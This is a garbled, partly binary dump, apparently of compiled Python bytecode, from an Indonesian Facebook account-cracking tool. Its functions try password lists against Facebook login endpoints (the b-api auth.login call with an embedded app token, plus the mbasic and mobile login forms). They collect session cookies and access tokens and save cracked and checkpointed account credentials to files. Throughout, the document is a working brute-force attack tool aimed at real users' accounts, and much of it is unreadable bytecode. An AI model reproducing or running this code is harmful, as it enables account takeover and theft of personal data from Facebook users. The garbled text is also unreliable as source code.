��dd|ddd�}t�� }|jdt| � d t|� d |d�}d|jv r�d|jv r�tdt� dt� | � d|� �� t�d| |f � t dt d��d| |f �  n�d|�� d  v �r^z`t d!d��� ad"t d#d��� ia|jd$| tf td%��� d& }|�d�\}}	}
t| }tdt� dt
� | � d|� d|	� d|� d|
� �
� t�d| |f � t d't d��d(| ||	||
f � W  nD t tf�y,   d}	d}d}
Y n   Y t!| ||� tdt� dt
� | � d|� �� t�d| |f � t d't d��d| |f �  nqDtd)7 ad S )*Nr�   rg   r�   �
�   [•] > r?  �/�CP : �OK : �    �sA�    8�|A� N  �@�  �	EXCELLENT�!cell.CTRadioAccessTechnologyHSDPAr�   �Liger�zx-fb-connection-bandwidthzx-fb-sim-hnizx-fb-net-hnizx-fb-connection-qualityzx-fb-connection-typer@   r�   zx-fb-http-engine�?https://b-api.facebook.com/method/auth.login?format=json&email=�
&password=�  &credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_inlololid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=truer�   �session_key�EAAA�----> �   •�%s|%sr3  rh   �%s|%s
�www.facebook.com�	error_msgrE   r`   rD   �-https://graph.facebook.com/%s?access_token=%srI   �birthdayr2  �%s|%s|%s %s %s
r+   )"rm   rn   r�   r/   r6   r7   r�   rt   ry   r�   rr   r
   r6  r   r5  r8   r1   rZ   r
   r   rT   rU   rV   r]   r   r�   r-  r�   r�   r`   rp   r�   r�   �cek_log�r�   rK  r�   �pwZheaders_r�   �send�ttlr�   r�   r�   r   r   r   rD  [  sN   �Z
:&0"rD  c                 C   s�  z	t dd��� }W n ty   d}Y nw tj�dt� dt� dt� dt	t
�� dt� dt� t	t�� dt
� d	t
� t	t�� �� tj��  |D �]}|�� }tt�d
d��tt�dd
��tt�dd
��dd|ddd�}t�� }|jdt| � d t|� d |d�}d|jv r�d|jv r�tdt� dt� | � d|� �� t�d| |f � t dt d��d| |f �  n�d|�� d  v �rXz`t d!d��� ad"t d#d��� ia|jd$| tf td%��� d& }|�d�\}}	}
t| }tdt� dt� | � d|� d|	� dt � d|
� �
� t�d| |f � t d't�d��d(| ||	||
f � W  n> t!tf�y,   d}	d}d}
Y n   Y tdt� dt"� | � d|� �� t�d| |f � t d)t d��d| |f �  nqDtd*7 ad S )+Nr�   rg   r�   rL  rM  r?  rN  rO  rP  rQ  rR  rS  rT  rU  rV  r�   rW  rX  rY  rZ  r[  r�   r\  r]  r^  r_  r`  r3  rh   ra  rb  rc  rE   r`   rD   rd  rI   re  zCP/%s.json%rf  r2  r+   )#rm   rn   r�   r/   r6   r7   r�   rt   ry   r�   rr   r
   r6  r   r5  r8   r1   rZ   r
   r   rT   rU   rV   r]   r   r�   r-  r�   r�   r`   rp   r�   Zmontr�   rB   rh  r   r   r   rE  �  sL   �Z
:&0"rE  c                 C   s|  z	t dd��� }W n ty   d}Y nw tj�dt� dt� dt� dt	t
�� dt� dt� t	t�� dt
� d	t
� t	t�� �� tj��  |D �]r}i }|�� }t�� }|j�d
ddd
|dddddd�
� |�d�j}t|d�}g d�}|d�D ] }	z|	�d�|v r�|�|	�d�|	�d�i� nW quW qu   Y qu|�| |dddddddddd�� |jd|d�}
d |j�� �� v r�d!�d"d#� |j�� �� D ���d$d�}tdt� d%t
� | � d&|� �� t� d'| |f � t d(t! d)��d*| |f �  n�d+|j�� �� v �r�zwt d,d��� a"d-t d.d��� ia#t�� �X}|jd/| t"f t#d0��$� d1 }|�%d�\}
}}t&|
 }
tdt� d%t
� | � d&|� d&|� d|
� d|� �
� t� d'| |f � t d(t! d)��d2| |||
|f � 	 W d   � W  nO1 �smw   Y  W n t'tf�y�   d}d}
d}Y n   Y t(| ||� tdt� d%t
� | � d&|� �� t� d'| |f � t d3t! d)��d*| |f �  nqDtd47 ad S )5Nr�   rg   r�   rL  rM  r?  rN  rO  rP  r	   r�   r�   r�   r�   �:https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8r�   r�   r�   �
r�   r�   r   r�   r@   r�   r�   r�   r�   r�   �7https://mbasic.facebook.com/login/?next&ref=dbl&refid=8rK   �r  rP   r  r  r  r  rA   r�   r�   r  r  �false�true�r	  r
  Zprefill_contact_pointZprefill_sourceZprefill_typeZfirst_prefill_sourceZfirst_prefill_typeZhad_cp_prefilledZhad_password_prefilledZ
is_smart_lockZ_fb_noscript�yhttps://mbasic.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2F&lwv=100&refid=8r  r  �;c                 S   �   g | ]
\}}d ||f �qS �z%s=%sr   �r  rJ  r  r   r   r   r  �  �    zmbasic.<locals>.<listcomp>�noscript=1;r^  r_  r`  r2  rh   ra  r
  rE   r`   rD   rd  rI   re  rf  r3  r+   �)rm   rn   r�   r/   r6   r7   r�   rt   ry   r�   rr   r
   r6  r   r5  r8   r1   rT   rU   r�   r  rV   r]   �parserrN   rJ   �get_dict�keys�join�itemsr0  r   r�   r-  r�   r`   r�   rp   �	bulan_ttlr�   rg  �r�   rK  r�   ri  Zfii_gtgr�   �p�bZblr�   ZdekuZkukirk  r�   r�   r�   r   r   r   rF  �  �j   �Z
"
*�
"&
0"(�rF  c                 C   sp  z	t dd��� }W n ty   d}Y nw tj�dt� dt� dt� dt	t
�� dt� dt� t	t�� dt
� d	t
� t	t�� �� tj��  |D �]l}i }|�� }t�� }|j�d
ddd
|dddddd�
� |�d�j}t|d�}g d�}|d�D ] }	z|	�d�|v r�|�|	�d�|	�d�i� nW quW qu   Y qu|�| |dddddddddd�� |jd|d�}
d |j�� �� v r�d!�d"d#� |j�� �� D ���d$d�}tdt� d%t� | � d&|� �� t� d'| |f � t d(t! d)��d*| |f �  n�d+|j�� �� v �r�zwt d,d��� a"d-t d.d��� ia#t�� �X}|jd/| t"f t#d0��$� d1 }|�%d�\}
}}t&|
 }
tdt� d%t
� | � d&|� d&|� d|
� d|� �
� t� d'| |f � t d2t! d)��d3| |||
|f � 	 W d   � W  nI1 �smw   Y  W n t'tf�y�   d}d}
d}Y n   Y tdt� d%t
� | � d&|� �� t� d'| |f � t d2t! d)��d*| |f �  nqDtd47 ad S )5Nr�   rg   r�   rL  rM  r?  rN  rO  rP  r	   r�   r�   r�   r�   rl  r�   r�   r�   rm  rn  rK   ro  r�   r�   r  r  rp  rq  rr  rs  r  r  rt  c                 S   ru  rv  r   rw  r   r   r   r  �  rx  zmbasicc.<locals>.<listcomp>ry  r^  r_  r`  r3  rh   ra  r
  rE   r`   rD   rd  rI   re  r2  rf  r+   )(rm   rn   r�   r/   r6   r7   r�   rt   ry   r�   rr   r
   r6  r   r5  r8   r1   rT   rU   r�   r  rV   r]   r{  rN   rJ   r|  r}  r~  r  r0  r   r�   r-  r�   r`   r�   rp   r�  r�   r�  r   r   r   rH  �  �h   �Z
"
*�
"&
0"(�rH  c                 C   s|  z	t dd��� }W n ty   d}Y nw tj�dt� dt� dt� dt	t
�� dt� dt� t	t�� dt
� d	t
� t	t�� �� tj��  |D �]r}i }|�� }t�� }|j�d
ddd
|dddddd�
� |�d�j}t|d�}g d�}|d�D ] }	z|	�d�|v r�|�|	�d�|	�d�i� nW quW qu   Y qu|�| |dddddddddd�� |jd|d�}
d |j�� �� v r�d!�d"d#� |j�� �� D ���d$d�}tdt� d%t� | � d&|� �� t� d'| |f � t d(t! d)��d*| |f �  n�d+|j�� �� v �r�zwt d,d��� a"d-t d.d��� ia#t�� �X}|jd/| t"f t#d0��$� d1 }|�%d�\}
}}t&|
 }
tdt� d%t
� | � d&|� d&|� d|
� d|� �
� t� d'| |f � t d2t! d)��d3| |||
|f � 	 W d   � W  nO1 �smw   Y  W n t'tf�y�   d}d}
d}Y n   Y t(| ||� tdt� d%t
� | � d&|� �� t� d'| |f � t d(t! d)��d*| |f �  nqDtd47 ad S )5Nr�   rg   r�   rL  rM  r?  rN  rO  zOk : zhttps://mobile.facebook.comr�   r�   r�   r�   rl  r�   r�   r�   rm  �7https://mobile.facebook.com/login/?next&ref=dbl&refid=8rK   ro  r�   r�   r  r  rp  rq  rr  �yhttps://mobile.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2F&lwv=100&refid=8r  r  rt  c                 S   ru  rv  r   rw  r   r   r   r  5  rx  zmobil.<locals>.<listcomp>ry  r^  r_  r`  r2  rh   ra  r
  rE   r`   rD   rd  rI   re  r3  rf  r+   rz  r�  r   r   r   rG    r�  rG  c                 C   sp  z	t dd��� }W n ty   d}Y nw tj�dt� dt� dt� dt	t
�� dt� dt� t	t�� dt
� d	t
� t	t�� �� tj��  |D �]l}i }|�� }t�� }|j�d
ddd
|dddddd�
� |�d�j}t|d�}g d�}|d�D ] }	z|	�d�|v r�|�|	�d�|	�d�i� nW quW qu   Y qu|�| |dddddddddd�� |jd|d�}
d |j�� �� v r�d!�d"d#� |j�� �� D ���d$d�}tdt� d%t � | � d&|� �� t�!d'| |f � t d(t" d)��d*| |f �  n�d+|j�� �� v �r�zwt d,d��� a#d-t d.d��� ia$t�� �X}|jd/| t#f t$d0��%� d1 }|�&d�\}
}}t'|
 }
tdt� d2t
� | � d&|� d&|� d|
� d|� �
� t�!d'| |f � t d3t" d)��d4| |||
|f � 	 W d   � W  nI1 �smw   Y  W n t(tf�y�   d}d}
d}Y n   Y tdt� d%t
� | � d&|� �� t�!d'| |f � t d3t" d)��d*| |f �  nqDtd57 ad S )6Nr�   rg   r�   rL  rM  r?  rN  rO  rP  r	   r�   r�   r�   r�   rl  r�   r�   r�   rm  r�  rK   ro  r�   r�   r  r  rp  rq  rr  r�  r  r  rt  c                 S   ru  rv  r   rw  r   r   r   r  l  rx  zmobill.<locals>.<listcomp>ry  r^  r_  r`  r2  rh   ra  r
  rE   r`   rD   rd  rI   re  z |----> z
Ok/%s.jsonrf  r+   ))rm   rn   r�   r/   r6   r7   r�   rt   ry   r�   rr   r
   r6  r   r5  r8   r1   rT   rU   r�   r  rV   r]   r{  rN   rJ   r|  r}  r~  r  r0  r   r   r�   r-  r�   r`   r�   rp   r�  r�   r�  r   r   r   rI  U  r�  rI  c                 C   s�  d}t �� }g }|j�ddd|d|dddd	d
d|d d
dd�� i }t|j|d d|id�jd�}|�dddi�}g d�}	|�d�D ]}
|
�d�|	v rY|�|
�d�|
�d�i� qBqB|�| |d�� t|j	||�d� |dd�jd�}d|j
v �r|�d�}|�dddi�d }
|�ddd i�d }|�ddd!i�d }|
|
||d"d#|d$�}t|j	||d  |d%�jd�}d&d'� |�d(�D �}td)t� d*t
� d+t� | � d,|� �	� tt|��D ]"}tt� d-t� t|d. �� t� d/t� d0t� d-t� || � t� �
� q�d1tt|��v �rtt� d*t� d2�� d S d S d3t|�v �r,td)t� d*t
� d4t� | � d,|� �	� d S td)t� d*t
� d4t� | � d,|� �	� d S )5Nr	   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r@   r�   rK   rL   rM   rN   r  r�   r�   r  r  rR   Tr  r
  rO   rP   r  r  r  r  r  c                 S   r  r   r  r  r   r   r   r  �  r  zcek_log.<locals>.<listcomp>r  rL  r�   z-----> r_  r  r+   r�   z>>>>>r�   z* Hore akunya tab yesss, silahkan di login r  r^  )rT   rU   r�   r  r{  rV   r]   ro   rY   rN   rJ   r   rt   r
   r�   r�   r�   r=   r   rZ   r   )r�   ri  r�   Zmbr�   r  rS   r  r   r!  r�   r"  rL   r#  r$  r  r%  r&  r'  r(  r   r   r   rg  �  s>   0"
$B�((rg  �__main__r,   )rZ	PengarangZFacebookZ	InstagramZWhatsappZYouTuber{   Z	PostinganrZ   r�   rT   Zbs4r/   r2   r
   r9   r[   r�   Zuuid�
subprocessr   �concurrent.futuresr   Z
ThreadPoolZrequests.exceptionsr   r   rW   r{  r   r   �urllib.parser   �Zr�   r   r
   r�   r   r   rt   r   r   �ImportErrorr   r3   Z
concurrentr�   r   r   r�   Zskrngr�   Ztahunr�   Zbulanr�   Zharir�  Z	bulan_cekru   Zbulan_skrng�
ValueErrorr�   r-  rr   r6  r5  ry   r4   r=   r�   r�   Zkata_devr�   Zm_fbrF  Zheader_gruprH   rf   rs   rw   rx   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   rU   r�   Zthreadsr�   r�   r�   r�   r)  r�   r�   r�   rB  rC  rD  rE  rH  rG  rI  rg  r�   r   r   r   r   �<module>   s�   P���
�
)3	;  _++7676
#

�